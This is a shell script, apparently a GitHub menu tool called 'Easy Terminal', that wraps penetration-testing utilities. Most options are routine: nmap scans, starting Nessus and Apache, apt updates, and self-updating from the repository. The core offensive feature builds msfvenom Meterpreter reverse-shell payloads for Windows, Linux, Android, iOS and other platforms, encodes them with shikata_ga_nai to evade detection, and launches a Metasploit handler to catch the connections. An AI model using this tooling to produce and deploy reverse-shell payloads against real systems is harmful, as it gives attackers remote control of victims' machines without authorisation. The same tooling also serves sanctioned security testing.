#!/bin/sh

# Define Colors
cyan='\e[0;36m'
Blue2='\e[0;34m'
okegreen='\033[92m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[0;33m'
orange='\e[0;33m'

print_menu() {
    echo $Blue2"========================================================================="
    figlet "Easy Terminal" | lolcat
    echo "[---]       Welcome to Easy Terminal ( Version 1.3.9 Beta )       [---]"| lolcat 
    echo "[---] GitHub ( https://github.com/DevBO7MED/easy-terminal-script )[---]"| lolcat
    echo "[---]                    Created by:DevBO7MED                     [---]"| lolcat
    figlet "BO7MED MIX YT" | lolcat
    echo $Blue2"========================================================================="
    echo 
    echo $okegreen"    [01] Start Nmap Scan           "
    echo $okegreen"    [02] Create Payload            "
    echo $okegreen"    [03] Create Metasploit Listener"
    echo $okegreen"    [04] Start Nessus              "
    echo $okegreen"    [05] Start Apache2          "
    echo $okegreen"    [06] Stop Apache2           "
    echo $okegreen"    [07] Update & Upgrade System"
    echo $okegreen"    [08] Remove Old Files       "
    echo $okegreen"    [09] Chek For Updates       "
    echo $okegreen"    [10] Exit                   "
}

show_ip_addresses() {
    echo "========================================================================="
    echo "IPv4 and IPv6 Addresses"
    echo "========================================================================="
    echo "IPv4 Addresses:"
    ip -4 addr show | grep inet | awk '{print $2}'
    echo ""
    echo "IPv6 Addresses:"
    ip -6 addr show | grep inet6 | awk '{print $2}'
    echo "========================================================================="
}



update_script() {
    
    repo_url="https://github.com/DevBO7MED/easy-terminal-script"
    
    script_dir=$(dirname "$(realpath "$0")")
    
    temp_dir="/tmp/easy-terminal-update"

    echo "Updating repository..."

    
    mkdir -p "$temp_dir"

   
    echo "Cloning repository to temporary directory..."
    git clone --depth 1 $repo_url "$temp_dir" > /dev/null 2>&1

    if [ $? -ne 0 ]; then
        echo "Failed to clone the repository. Please check your internet connection and try again."
        exit 1
    fi

   
    files_to_check="install.sh eterm.sh"

    
    update_needed=0
    for file in $files_to_check; do
        if [ -f "$script_dir/$file" ] && [ -f "$temp_dir/$file" ]; then
            
            if ! cmp -s "$script_dir/$file" "$temp_dir/$file"; then
                echo "$file has been updated."
                update_needed=1
            fi
        else
            echo "$file is missing in the script directory."
            update_needed=1
        fi
    done

    if [ $update_needed -eq 1 ]; then
        echo "Updating files..."
        for file in $files_to_check; do
            if [ -f "$temp_dir/$file" ]; then
                cp "$temp_dir/$file" "$script_dir/"
            fi
        done
        echo "Files updated successfully!"
    else
        echo "No updates found for the specified files."
    fi


    rm -rf "$temp_dir"

    echo "Press [ENTER] to return to the menu."
    read cont
    clear
}



nmap_options() {
    echo ""
    echo $orange "+------------------------------------------+"
    echo $orange "|$white [1] $yellow Basic Scan$orange                          |"
    echo $orange "|$white [2] $yellow Version Detection$orange                   |"
    echo $orange "|$white [3] $yellow OS Detection$orange                        |"
    echo $orange "|$white [4] $yellow All Scan$orange                            |"
    echo $orange "+------------------------------------------+"
    echo ""
    echo $okegreen "Choose Scan Type: ";tput sgr0
    read scan_type

    case $scan_type in
        1)
            scan_args="-sS -O -Pn -sV -p-"
            ;;
        2)
            scan_args="-sV"
            ;;
        3)
            scan_args="-O"
            ;;
        4)
            scan_args="-sS -O -Pn -sV -p-"
            ;;
        *)
            echo ""
            echo $red "Invalid option, choose between 1 and 4"
            nmap_options
            ;;
    esac
}

payload_option() {
    echo ""
    echo $orange "+------------------------------------------+"
    echo $orange "|$white [1] $yellow windows/meterpreter/reverse_tcp$orange     |"
    echo $orange "|$white [2] $yellow windows/meterpreter/reverse_http$orange    |"
    echo $orange "|$white [3] $yellow windows/meterpreter/reverse_https$orange   |"
    echo $orange "|$white [4] $yellow linux/x86/meterpreter/reverse_tcp$orange   |"
    echo $orange "|$white [5] $yellow linux/x64/meterpreter/reverse_tcp$orange   |"
    echo $orange "|$white [6] $yellow php/meterpreter/reverse_tcp$orange         |"
    echo $orange "|$white [7] $yellow python/meterpreter/reverse_tcp$orange      |"
    echo $orange "|$white [8] $yellow android/meterpreter/reverse_tcp$orange     |"
    echo $orange "|$white [9] $yellow ios/meterpreter/reverse_tcp$orange         |"
    echo $orange "|$white [10]$yellow unix/meterpreter/reverse_tcp$orange        |"
    echo $orange "+------------------------------------------+"
    echo ""
    echo $okegreen "Choose Payload Type: ";tput sgr0
    read payload_type
    

    case $payload_type in
        1)
            export PAYLOAD_TYPE="windows/meterpreter/reverse_tcp"
            ;;
        2)
            export PAYLOAD_TYPE="windows/meterpreter/reverse_http"
            ;;
        3)
            export PAYLOAD_TYPE="windows/meterpreter/reverse_https"
            ;;
        4)
            export PAYLOAD_TYPE="linux/x86/meterpreter/reverse_tcp"
            ;;
        5)
            export PAYLOAD_TYPE="linux/x64/meterpreter/reverse_tcp"
            ;;
        6)
            export PAYLOAD_TYPE="php/meterpreter/reverse_tcp"
            ;;
        7)
            export PAYLOAD_TYPE="python/meterpreter/reverse_tcp"
            ;;
        8)
            export PAYLOAD_TYPE="android/meterpreter/reverse_tcp"
            ;;
        9)
            export PAYLOAD_TYPE="ios/meterpreter/reverse_tcp"
            ;;
        10)
            export PAYLOAD_TYPE="unix/meterpreter/reverse_tcp"
            ;;
        *)
            echo ""
            echo -e $red "Invalid option, choose between 1 and 10"
            payload_option
            ;;
    esac
}

execute_option() {
    case $1 in
        1)  
            echo
            nmap_options
            echo
            read -p "Enter Target IP or URL: " IP
            sudo nmap $scan_args $IP
            echo
            echo $okegreen"Press [ENTER] to return to the menu."
            read cont
            clear
            ;;
        2)  
            echo
            payload_option
            echo
            read -p "Enter LHOST \"IP\" (e.g., \"192.168.1.5\"): " lhost
            echo
            read -p "Enter LPORT \"Port\" (e.g., \"4444\"): " lport
            read -p "Enter Payload save path (e.g., \"/home/kali\"): " P
            echo
            read -p "Enter Payload name (e.g., \"Payload.exe\"): " N
            echo
            read -p "Enter Platform Name (e.g., \"windows\") " platform1
            echo
            read -p "Enter x86 or x64 Bit (e.g., \"x86\") " platform2
            echo
            echo "Creating Payload..."
            echo
            msfvenom -p $PAYLOAD_TYPE LHOST=$lhost LPORT=$lport --platform $platform1 -a $platform2 -f exe -e x86/shikata_ga_nai -i 5 -o $P/$N
            if [ $? -eq 0 ]; then
                echo "Payload created successfully!"
            else
                echo "Error: invalid payload."
            fi
            echo
            echo "Payload Path: $P/$N"
            echo
            echo "Press [ENTER] to return to the menu."
            read cont
            clear
            ;;
        3)  
            echo
            payload_option
            echo
            read -p "Enter LHOST \"IP\" (e.g., \"192.168.1.5\"): " LHOST
            echo
            read -p "Enter LPORT \"Port\" (e.g., \"4444\"): " LPORT
            echo
            xterm -e bash -c "echo 'Starting Metasploit Listener...'; sudo service metasploit start; msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $PAYLOAD_TYPE; set LHOST $LHOST; set LPORT $LPORT; exploit'" &
            clear
            ;;
        4)  
            echo
            sudo service nessusd start
            echo
            echo "Opening Nessus Web Interface..."
            echo
            echo "Nessus Service Started Successfully You Can Now Open This Link To Start Nessus \"http://localhost:8834\""
            echo
            echo "Press [ENTER] to return to the menu."
            read cont
            clear
            ;;
        5)  
            echo
            echo "Starting Apache2..."
            echo
            sudo service apache2 start
            echo
            echo "Apache2 started."
            echo
            echo "Press [ENTER] to return to the menu."
            read cont
            clear
            ;;
        6)  
            echo
            echo "Stopping Apache2..."
            echo
            sudo service apache2 stop
            echo
            echo "Apache2 stopped."
            echo
            echo "Press [ENTER] to return to the menu."
            read cont
            clear
            ;;
        7)  
            echo
            echo "Updating and Upgrading System..."
            echo
            sudo apt-get update && sudo apt-get upgrade -y
            echo
            echo "System updated and upgraded."
            echo
            echo "Press [ENTER] to return to the menu."
            read cont
            clear
            ;;
        8)  
            echo
            echo "Removing old system files..."
            echo
            sudo apt-get autoremove -y
            echo
            echo "Old files removed."
            echo
            echo "Press [ENTER] to return to the menu."
            read cont
            clear
            ;;
        9)  
            update_script
            ;;
        10) 
            echo "Exiting..."
            exit
            ;;
        *)
            echo ""
            echo $red"Invalid option, choose between 1 and 10"
            sleep 2
            ;;
    esac
}

while true; do
    clear
    print_menu
    echo
    echo $okegreen"┌─["$red"EasyTerminal$okegreen]──[$red~$okegreen]"
    read -p "└─────► " choice
    execute_option $choice
done
